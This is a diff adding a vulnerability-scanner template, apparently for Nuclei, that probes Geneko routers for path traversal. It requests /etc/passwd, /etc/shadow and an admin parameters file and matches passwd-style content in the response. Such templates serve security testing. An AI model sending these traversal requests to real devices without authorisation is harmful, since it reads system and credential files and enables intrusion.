@@ -1,0 +1,33 @@
+id: geneko-routers-path-traversal
+
+info:
+  name: Geneko Routers Path Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: path-traversal,info-leak
+  reference:
+    - https://blogs.securiteam.com/index.php/archives/3317
+
+variables:
+  file:
+    - /../../etc/passwd
+    - /../../etc/shadow
+    - /../../mnt/flash/params/j_admin_admin.params
+
+http:
+  - raw:
+      - |
+        GET {{file}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - ":/bin/sh"
+          - "nobody:"
+        part: body
+      - type: status
+        status:
+          - 200
